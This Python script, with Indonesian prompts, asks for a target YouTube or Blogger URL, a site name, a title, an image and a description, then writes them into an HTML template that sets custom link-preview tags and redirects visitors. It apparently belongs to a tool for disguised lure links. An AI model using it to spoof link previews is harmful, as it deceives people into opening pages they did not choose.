#!/usr/bin/env python3

import os
import utils

a = "\033[1;30m"
m = "\033[1;31m"
p = "\033[1;37m"
r = "\033[0m"
h = "\033[1;32m"

redirect = os.getenv('REDIRECT')
sitename = os.getenv('SITENAME')
title = os.getenv('TITLE')
imageUrl = os.getenv('IMAGE')
desc = os.getenv("DESC")

old = 'n'
if not redirect and not sitename and not title and not imageUrl and not desc:
    old = input(f'\n{a}[{m}?{a}]' + p + f' Pakai setelan sebelumnya{m}? {a}({p}Y{m}/{p}N{a}){m} :{a} ')

if old.lower() != 'y':
    if redirect is None:
        redirect = input(f'\n{a}[{m}?{a}]' + p + f' Masukkan URL Target {a}({p}YouTube Atau Blogger{a}){m} :{a} ')
    else:
        utils.print(f'{a}[{m}?{a}] {p}URL Target {m}:{a} '+redirect)
    
    if sitename is None:
        sitename = input(f'{a}[{m}?{a}]' + p + f' Nama Situs {m}:{a} ')
    else:
        utils.print(f'{a}[{m}?{a}] {p}Nama Situs {m}:{a} '+sitename)
    
    if title is None:
        title = input(f'{a}[{m}?{a}]' + p + f' Judul {m}:{a} ')
    else:
        utils.print(f'{a}[{m}+{a}] {p}Judul {m}:{a} '+title)
    
    if imageUrl is None:
        imageUrl = input(f'{a}[{m}?{a}]' + p + f' URL Gambar{m} :{a} ')
    else:
        utils.print(f'{a}[{m}?{a}] {p}Gambar {m}:{a} '+imageUrl)
    
    if desc is None:
        desc = input(f'{a}[{m}+{a}]' + p + f' Description {m}:{a} ')
    else:
        utils.print(f'{a}[{m}+{a}] {p}Description{m} :{a} '+desc)

    with open('template/custom_og_tags/index_temp.html', 'r') as index_temp:
        code = index_temp.read()
        if os.getenv("DEBUG_HTTP"):
            code = code.replace('window.location = "https:" + restOfUrl;', '')
        code = code.replace('$SITE_NAME$', sitename)
        code = code.replace('REDIRECT_URL', redirect)
        code = code.replace('$TITLE$', title)
        code = code.replace('$IMG_URL$', imageUrl)
        code = code.replace('$DESCRIPTION$', desc)

    with open('template/custom_og_tags/index.html', 'w') as new_index:
        new_index.write(code)
